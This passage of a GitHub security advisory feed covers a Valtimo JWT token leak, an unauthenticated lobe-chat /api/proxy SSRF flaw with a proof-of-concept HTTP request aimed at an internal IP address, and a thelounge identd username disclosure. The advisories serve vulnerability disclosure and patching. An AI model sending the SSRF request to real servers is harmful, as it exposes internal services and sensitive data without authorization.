<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34706">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</id>
        <link href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc"/>
        <updated>2024-05-14T20:03:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.</p>
<h3 id="details">Details</h3>
<ul>
<li>visit <a href="https://chat-preview.lobehub.com/settings/agent">https://chat-preview.lobehub.com/settings/agent</a>  </li>
<li>you can attack all internal services by /api/proxy and get the echo in http response :)</li>
</ul>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75"></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-http">POST /api/proxy HTTP/2
Host: xxxxxxxxxxxxxxxxx
Cookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0
Content-Length: 23
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://chat-preview.lobehub.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://chat-preview.lobehub.com/settings/agent
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7

http://172.23.0.1:8000/
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF ,All users will be impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32964">https://nvd.nist.gov/vuln/detail/CVE-2024-32964</a></li>
<li><a href="https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37">https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37</a></li>
<li><a href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/advisories/GHSA-mxhq-xw3g-rphc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-10T15:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thelounge] thelounge may publicly disclose of all usernames/idents via port 113]]></title>
        <id>https://github.com/advisories/GHSA-g49q-jw42-6x85</id>
        <link href="https://github.com/advisories/GHSA-g49q-jw42-6x85"/>
        <updated>2024-05-09T21:31:38.000Z</updated>
        <content type="html"><![CDATA[<p>Per RFC 1413, The unique identifying tuple includes not only the ports, but also the both addresses. Without the addresses, the information becomes both non-unique and public:</p>
<ul>
<li>If multiple connections happen to use the same local port number (which is possible if the addresses differ), the username of the first is returned for all, resulting in the wrong ident for all but the first.</li>
<li>By not checking the connection address, the information becomes public. Because there is only a relatively small number of local ports, and the remote ports are likely to be either 6667 or 6697, it becomes trivial to scan the entire range to get a list of idents.</li>
</ul>
<p>To prevent this from happening, disable identd or upgrade to a non vulnerable version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85">https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85</a></li>
<li><a href="https://github.com/thelounge/thelounge/pull/4872">https://github.com/thelounge/thelounge/pull/4872</a></li>
<li><a href="https://github.com/advisories/GHSA-g49q-jw42-6x85">https://github.com/advisories/GHSA-g49q-jw42-6x85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g49q-jw42-6x85</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-09T21:31:35.000Z</published>
    </entry>
</feed>